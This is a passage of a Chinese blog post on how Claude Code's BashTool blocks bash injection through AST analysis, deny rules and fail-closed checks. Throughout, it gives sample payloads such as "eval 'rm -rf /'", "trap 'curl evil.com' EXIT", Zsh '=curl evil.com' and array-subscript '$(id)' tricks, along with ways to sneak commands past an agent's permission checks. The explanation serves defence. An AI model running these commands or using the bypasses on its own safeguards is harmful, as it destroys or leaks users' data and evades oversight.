+</span><span class=lnt id=hl-3-18><a class=lnlinks href=#hl-3-18>18</a>
+</span><span class=lnt id=hl-3-19><a class=lnlinks href=#hl-3-19>19</a>
+</span><span class=lnt id=hl-3-20><a class=lnlinks href=#hl-3-20>20</a>
+</span><span class=lnt id=hl-3-21><a class=lnlinks href=#hl-3-21>21</a>
+</span><span class=lnt id=hl-3-22><a class=lnlinks href=#hl-3-22>22</a>
+</span><span class=lnt id=hl-3-23><a class=lnlinks href=#hl-3-23>23</a>
+</span><span class=lnt id=hl-3-24><a class=lnlinks href=#hl-3-24>24</a>
+</span><span class=lnt id=hl-3-25><a class=lnlinks href=#hl-3-25>25</a>
+</span><span class=lnt id=hl-3-26><a class=lnlinks href=#hl-3-26>26</a>
+</span><span class=lnt id=hl-3-27><a class=lnlinks href=#hl-3-27>27</a>
+</span><span class=lnt id=hl-3-28><a class=lnlinks href=#hl-3-28>28</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>+----------------------------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>EVAL</span><span class=o>-</span><span class=n>LIKE</span> <span class=n>BUILTINS</span> <span class=p>(</span><span class=n>argv</span> <span class=n>lies</span> <span class=n>to</span> <span class=n>you</span><span class=p>)</span>       <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>                                              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>eval</span> <span class=s2>&#34;rm -rf /&#34;</span>                             <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>argv</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;rm -rf /&#34;</span><span class=p>]</span>                <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>looks</span><span class=p>:</span> <span class=n>string</span> <span class=n>argument</span>                    <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>does</span><span class=p>:</span> <span class=n>executes</span> <span class=n>as</span> <span class=n>shell</span> <span class=n>code</span>              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>                                              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>trap</span> <span class=s1>&#39;curl evil.com&#39;</span> <span class=n>EXIT</span>                   <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>argv</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;trap&#34;</span><span class=p>,</span> <span class=s2>&#34;curl evil.com&#34;</span><span class=p>,</span> <span class=s2>&#34;EXIT&#34;</span><span class=p>]</span>   <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>looks</span><span class=p>:</span> <span class=k>signal</span> <span class=n>handler</span> <span class=n>setup</span>               <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>does</span><span class=p>:</span> <span class=n>runs</span> <span class=n>curl</span> <span class=n>on</span> <span class=n>EVERY</span> <span class=n>shell</span> <span class=n>exit</span>       <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>                                              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>enable</span> <span class=o>-</span><span class=n>f</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>evil</span><span class=o>.</span><span class=n>so</span> <span class=n>pwn</span>                  <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>argv</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;enable&#34;</span><span class=p>,</span> <span class=s2>&#34;-f&#34;</span><span class=p>,</span> <span class=s2>&#34;/tmp/evil.so&#34;</span><span class=o>...</span><span class=p>]</span> <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>looks</span><span class=p>:</span> <span class=n>shell</span> <span class=n>config</span> <span class=n>command</span>               <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>does</span><span class=p>:</span> <span class=n>dlopen</span> <span class=n>arbitrary</span> <span class=n>native</span> <span class=n>code</span>        <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>                                              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=n>coproc</span> <span class=n>rm</span> <span class=o>-</span><span class=n>rf</span> <span class=o>/</span>                             <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>argv</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;coproc&#34;</span><span class=p>,</span> <span class=s2>&#34;rm&#34;</span><span class=p>,</span> <span class=s2>&#34;-rf&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>]</span>        <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>looks</span><span class=p>:</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;coproc&#34;</span>                 <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>does</span><span class=p>:</span> <span class=n>runs</span> <span class=s2>&#34;rm -rf /&#34;</span> <span class=n>as</span> <span class=n>coprocess</span>        <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>                                              <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=nb>hash</span> <span class=o>-</span><span class=n>p</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>evil</span> <span class=n>cmd</span>                       <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>argv</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;hash&#34;</span><span class=p>,</span> <span class=s2>&#34;-p&#34;</span><span class=p>,</span> <span class=s2>&#34;/tmp/evil&#34;</span><span class=p>,</span> <span class=s2>&#34;cmd&#34;</span><span class=p>]</span>  <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>looks</span><span class=p>:</span> <span class=nb>hash</span> <span class=n>table</span> <span class=n>config</span>                  <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>does</span><span class=p>:</span> <span class=n>poisons</span> <span class=n>command</span> <span class=n>lookup</span> <span class=n>cache</span>        <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+----------------------------------------------+</span></span></span></code></pre></td></tr></table></div></div><p>Claude Code 维护了一个约 20 个命令的 eval-like 列表。这些命令一出现在 argv[0] 就标记为 too-complex，除了少数安全变体（<code>command -v</code> 只查路径不执行，<code>fc -l</code> 只列历史不重放）。</p><p>最阴险的可能是 trap：<code>trap 'cmd' EXIT</code> 注册一个在 shell 退出时执行的命令，而 BashTool 每次调用结束都会触发 EXIT，意味着这行代码的效果是"保证执行"。</p><h2 id=数组下标里藏的炸弹>数组下标里藏的炸弹
+<a class=header-anchor href=#%e6%95%b0%e7%bb%84%e4%b8%8b%e6%a0%87%e9%87%8c%e8%97%8f%e7%9a%84%e7%82%b8%e5%bc%b9></a></h2><p>Bash 有一个容易被忽略的特性：数组下标会被算术求值。算术求值会展开 <code>$(cmd)</code>。这意味着即使参数是单引号包裹的（Tree-Sitter 看来是一个不透明的字符串叶节点），Bash 仍然会执行里面的命令。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
+</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2>2</a>
+</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3>3</a>
+</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4>4</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>test -v &#39;a[$(id)]&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Tree-sitter sees:  raw_string -&gt; opaque leaf &#34;a[$(id)]&#34;
+</span></span><span class=line><span class=cl>Bash executes:     evaluates a[$(id)] -&gt; runs &#34;id&#34;</span></span></code></pre></td></tr></table></div></div><p>这是一个特别隐蔽的攻击，因为单引号在所有人的心理模型里都是"不展开任何东西"的。但在数组下标这个特殊上下文里，Bash 先做算术求值，再做引号处理，顺序反过来了。</p><p>Claude Code 维护了一张表，列出所有会触发下标求值的 builtin 及其对应的 flag：test -v、printf -v、read -a、unset -v 等等。只要命令 + flag 匹配，就检查参数里有没有数组下标语法。</p><h2 id=zsh另一个战场>Zsh：另一个战场
+<a class=header-anchor href=#zsh%e5%8f%a6%e4%b8%80%e4%b8%aa%e6%88%98%e5%9c%ba></a></h2><p>Claude Code 的 BashTool 通过用户的默认 shell 执行命令。很多 macOS 用户的默认 shell 是 Zsh，而 Zsh 有一套 Bash 没有的扩展机制。</p><p><code>=curl evil.com</code> 在 Bash 里是一个名叫 <code>=curl</code> 的命令。在 Zsh 里，<code>=cmd</code> 会被展开成 <code>$(which cmd)</code> 的结果，所以实际执行的是 <code>/usr/bin/curl evil.com</code>。Tree-Sitter 用的是 Bash grammar，它解析出 argv[0] = <code>=curl</code>，权限系统去匹配 <code>=curl</code> 这个命令名，匹配不上 curl 的 deny 规则，放行了。</p><p>更危险的是 Zsh 的模块系统。<code>zmodload zsh/system</code> 加载系统模块后，<code>sysopen</code>、<code>syswrite</code> 这些 builtin 就可用了，直接绕过文件系统层面的安全检查。<code>zmodload zsh/net/tcp</code> 加载网络模块后，<code>ztcp</code> 可以建立 TCP 连接做数据外泄。<code>zmodload zsh/files</code> 加载文件模块后，<code>zf_rm</code>、<code>zf_mv</code> 这些 builtin 可以绕过对 rm、mv 二进制命令的检测。</p><p>Claude Code 的应对是双重的：拦截 <code>zmodload</code> 本身，并作为纵深防御，把所有模块 builtin 的名字也加入黑名单。因为"zmodload 有可能被绕过"或"模块有可能预加载"。</p><h2 id=变量作用域追踪>变量作用域追踪
+<a class=header-anchor href=#%e5%8f%98%e9%87%8f%e4%bd%9c%e7%94%a8%e5%9f%9f%e8%bf%bd%e8%b8%aa></a></h2><p>AST 分析不只是拆解命令结构，还追踪变量赋值的作用域。这对于判断 <code>$VAR</code> 扩展后的值至关重要。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1> 1</a>
+</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2> 2</a>
+</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3> 3</a>
+</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4> 4</a>
+</span><span class=lnt id=hl-5-5><a class=lnlinks href=#hl-5-5> 5</a>
+</span><span class=lnt id=hl-5-6><a class=lnlinks href=#hl-5-6> 6</a>
+</span><span class=lnt id=hl-5-7><a class=lnlinks href=#hl-5-7> 7</a>
+</span><span class=lnt id=hl-5-8><a class=lnlinks href=#hl-5-8> 8</a>
+</span><span class=lnt id=hl-5-9><a class=lnlinks href=#hl-5-9> 9</a>
+</span><span class=lnt id=hl-5-10><a class=lnlinks href=#hl-5-10>10</a>
+</span><span class=lnt id=hl-5-11><a class=lnlinks href=#hl-5-11>11</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Safe pattern:
+</span></span><span class=line><span class=cl>  NOW=$(date) &amp;&amp; jq --arg now &#34;$NOW&#34; ...
+</span></span><span class=line><span class=cl>  -&gt; $NOW is tracked as __CMDSUB_OUTPUT__ (known)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Dangerous pattern:
+</span></span><span class=line><span class=cl>  true || FLAG=--dry-run &amp;&amp; cmd $FLAG
+</span></span><span class=line><span class=cl>  -&gt; || RHS runs conditionally
+</span></span><span class=line><span class=cl>  -&gt; FLAG may NOT be set
+</span></span><span class=line><span class=cl>  -&gt; bash skips ||, runs &#34;cmd&#34; (no --dry-run)
+</span></span><span class=line><span class=cl>  -&gt; linear scope would say [&#34;cmd&#34;,&#34;--dry-run&#34;] = SAFE
+</span></span><span class=line><span class=cl>  -&gt; actual execution: [&#34;cmd&#34;] with no safety flag</span></span></code></pre></td></tr></table></div></div><p>关键设计：变量作用域在 <code>||</code>、<code>|</code>、<code>&</code> 操作符处重置。因为 <code>||</code> 右边的代码只在左边失败时执行（条件性的），<code>|</code> 的各段在子 shell 里运行（变量不可见），<code>&</code> 在后台子 shell 运行（同上）。只有 <code>&&</code> 和 <code>;</code> 才线性传递变量。</p><p>如果不做这个区分，攻击者可以用 <code>true || SAFE_FLAG=yes && dangerous_cmd $SAFE_FLAG</code> 的模式，让静态分析以为 <code>dangerous_cmd</code> 带着安全 flag 运行，而 Bash 实际上跳过了赋值。</p><h2 id=包装命令的层层剥离>包装命令的层层剥离
+<a class=header-anchor href=#%e5%8c%85%e8%a3%85%e5%91%bd%e4%bb%a4%e7%9a%84%e5%b1%82%e5%b1%82%e5%89%a5%e7%a6%bb></a></h2><p><code>time</code>、<code>nohup</code>、<code>timeout</code>、<code>nice</code>、<code>env</code>、<code>stdbuf</code> 这些命令本身不危险，它们包裹真正的命令执行。安全分析必须剥掉这些包装，检查里面的命令。</p><p>但剥离本身也有坑。<code>timeout .5 eval "id"</code> 里，<code>.5</code> 是超时时间，<code>eval</code> 是真正的命令。如果超时时间的正则没匹配上 <code>.5</code>（只匹配了整数），<code>eval</code> 就被误认为超时时间参数，剥离后看到的是 <code>"id"</code> 这个无害字符串。</p><p>更极端的例子：<code>stdbuf --output 0 eval</code> 里，如果 flag 解析把 <code>0</code> 当成了命令名（name=&lsquo;0&rsquo;），eval 就完全隐身了。</p><p>Claude Code 对每个包装命令都写了完整的 flag 解析逻辑，遇到不认识的 flag 直接返回 too-complex。又是 fail-closed。</p><h2 id=两套系统的并行>两套系统的并行
+<a class=header-anchor href=#%e4%b8%a4%e5%a5%97%e7%b3%bb%e7%bb%9f%e7%9a%84%e5%b9%b6%e8%a1%8c></a></h2><p>旧的 23 个正则 Validator 没有删掉，标记为 @deprecated 但仍然在运行。新的 AST 路径和旧的正则路径并行执行，系统记录两者结果的分歧：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1> 1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2> 2</a>
+</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3> 3</a>
+</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4> 4</a>
+</span><span class=lnt id=hl-6-5><a class=lnlinks href=#hl-6-5> 5</a>
+</span><span class=lnt id=hl-6-6><a class=lnlinks href=#hl-6-6> 6</a>
+</span><span class=lnt id=hl-6-7><a class=lnlinks href=#hl-6-7> 7</a>
+</span><span class=lnt id=hl-6-8><a class=lnlinks href=#hl-6-8> 8</a>
+</span><span class=lnt id=hl-6-9><a class=lnlinks href=#hl-6-9> 9</a>
+</span><span class=lnt id=hl-6-10><a class=lnlinks href=#hl-6-10>10</a>
+</span><span class=lnt id=hl-6-11><a class=lnlinks href=#hl-6-11>11</a>
+</span><span class=lnt id=hl-6-12><a class=lnlinks href=#hl-6-12>12</a>
+</span><span class=lnt id=hl-6-13><a class=lnlinks href=#hl-6-13>13</a>
+</span><span class=lnt id=hl-6-14><a class=lnlinks href=#hl-6-14>14</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+-------------------+     +-------------------+
+</span></span><span class=line><span class=cl>| AST Path (new)    |     | Regex Path (old)  |
+</span></span><span class=line><span class=cl>|                   |     |                   |
+</span></span><span class=line><span class=cl>| tree-sitter parse |     | quote stripping   |
+</span></span><span class=line><span class=cl>| allowlist walk    |     | 23 validators     |
+</span></span><span class=line><span class=cl>| argv extraction   |     | pattern matching  |
+</span></span><span class=line><span class=cl>+--------+----------+     +--------+----------+
+</span></span><span class=line><span class=cl>         |                         |
+</span></span><span class=line><span class=cl>         v                         v
+</span></span><span class=line><span class=cl>    SimpleCommand[]           PermissionResult
+</span></span><span class=line><span class=cl>         |                         |
+</span></span><span class=line><span class=cl>         +--------&gt; COMPARE &lt;------+
+</span></span><span class=line><span class=cl>                      |
+</span></span><span class=line><span class=cl>              log divergence to telemetry</span></span></code></pre></td></tr></table></div></div><p>这不是冗余，是有意为之的安全网。如果 AST 路径有 bug 放过了一个危险命令，正则路径可能会捕到它（反之亦然）。分歧日志在 Datadog 里被监控，任何分歧都是值得调查的信号。</p><h2 id=注释里的攻防史>注释里的攻防史
+<a class=header-anchor href=#%e6%b3%a8%e9%87%8a%e9%87%8c%e7%9a%84%e6%94%bb%e9%98%b2%e5%8f%b2></a></h2><p>这套代码最让人印象深刻的不是技术复杂度，是注释。几乎每个安全检查旁边都有一段故事：为什么加了这个检查，具体的攻击是什么，之前的绕过方式是什么，为什么现在的方案能防住。</p><p>比如 <code>stripSafeRedirections</code> 函数旁边写着：没有 <code>(?=\s|$)</code> 作为尾部边界，<code>> /dev/nullo</code> 会匹配到 <code>/dev/null</code> 前缀，剥离 <code>> /dev/null</code>，剩下一个 <code>o</code>。攻击者实际写入 <code>/dev/nullo</code>，但验证器看不到 <code>></code> 操作符了。</p><p>又比如 heredoc 提取器的注释解释了为什么不能用简单的正则匹配结束标记：<code>&lt;&lt;'EOF'</code> 在 <code>$()</code> 里面时，Bash 的 make_cmd.c 第 606 行会在遇到 <code>)</code> 时提前关闭 heredoc。不处理这个边界，结束标记的定位就会出错。</p><p>这些注释读起来像一部 Bash 安全研究的编年史。每一条规则的背后都是一次真实的攻防交锋。</p><h2 id=纵深防御的哲学>纵深防御的哲学
+<a class=header-anchor href=#%e7%ba%b5%e6%b7%b1%e9%98%b2%e5%be%a1%e7%9a%84%e5%93%b2%e5%ad%a6></a></h2><p>回过头看这套系统的整体架构：</p><p>第一层是 AST allowlist。只理解已知结构，不理解的一律拦截。这是主防线，覆盖面最广。</p><p>第二层是预检查。捕捉 Tree-Sitter 和 Bash 之间的已知差异，在 AST 分析之前就拦截。这是补丁层，每发现一个新的解析器差异就加一条。</p><p>第三层是语义检查。AST 能正确拆解结构，但有些命令的结构和行为不对应（eval、trap、数组下标求值）。这是业务逻辑层。</p><p>第四层是旧正则系统。已废弃但仍运行，作为分歧检测和兜底。</p><p>最上面是 YOLO Classifier，用 AI 做语义层面的安全判断。</p><p>五层，每层解决不同类型的问题，每层的默认行为都是拦截。这不是过度设计，是对 Bash 这门语言复杂度的尊重。</p></div><footer class=post-footer><div class=post-tags><a href=/tags/llm/>LLM
+</a><a href=/tags/llm-agent/>LLM Agent
+</a><a href=/tags/nlp/>NLP</a></div><hr><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/claude-code-context-compaction/ rel=next title="Claude Code 的上下文压缩:五层级联与免费摘要的艺术"><i class="fa fa-chevron-left"></i> Claude Code 的上下文压缩:五层级联与免费摘要的艺术</a></div><div class="post-nav-prev post-nav-item"><a href=/claude-code-auto-mode-security/ rel=prev title="深入 Claude Code 的 YOLO Classifier">深入 Claude Code 的 YOLO Classifier
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
+<span>评论交流</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=waline3-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div class=top-right-buttons><span id=toggle-theme-topbar title=深浅模式切换><i class="fas fa-lightbulb"></i>
+</span><span class=btn-divider></span>
+<a href=/en/claude-code-bash-security/ title=English><i class="fas fa-globe"></i> English</a></div><script>document.addEventListener("DOMContentLoaded",function(){var e=document.getElementById("toggle-theme-topbar");e&&e.addEventListener("click",function(){var e=document.getElementById("toggle-theme");e&&e.click()})})</script><div class=copyright>&copy;
+<span itemprop=copyrightYear>2026
+</span>&nbsp;|&nbsp;
+<i class="fa fa-eye"></i>&nbsp;<a href=https://finicounter.eu.org/ target=_blank rel=noopener title=FiniCounter>总访问量：<span id=finicount_views>...</span></a></div><script>(function(){fetch("https://finicounter.eu.org/counter?host="+window.location.hostname).then(function(e){return e.json()}).then(function(e){var t=document.getElementById("finicount_views");t&&e.views&&(t.innerText=e.views)}).catch(function(e){console.log(e)})})()</script><script type=text/javascript>function downloadJsAtOnload(){setTimeout(function(){var e=document.createElement("script");e.setAttribute("data-ad-client","ca-pub-2660281922577700"),e.async=!0,e.src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",document.body.appendChild(e)},5e3)}window.addEventListener?window.addEventListener("load",downloadJsAtOnload,!1):window.attachEvent?window.attachEvent("onload",downloadJsAtOnload):window.onload=downloadJsAtOnload</script></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":true,"expired":false,"isHome":false,"isPage":true,"path":"claude-code-bash-security","permalink":"https://finisky.github.io/claude-code-bash-security/","title":"Claude Code 怎么防住 Bash 注入","toc":true,"waline3":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"3.5.7"},"pagecnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"3.5.7"}}}</script><script type=text/javascript src=https://finisky.github.io/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://finisky.github.io/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":false,"save":"manual"},"copybtn":true,"darkmode":false,"hostname":"https://finisky.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"motion":{"async":true,"enable":false,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline3"},"views":{"enable":true,"plugin":"waline3"}},"root":"/","scheme":"Gemini","share":{"enable":false},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://finisky.github.io/js/3rd"}},"version":"4.8.3","waline3":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"","reaction":false,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":[],"search":true,"serverurl":"https://comments.finisky.eu.org","sofa":"","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"3.5.7"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"3.5.7"}}}</script><script type=text/javascript src="/js/main.min.js?=1777480352" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1777480353" defer></script></body></html>
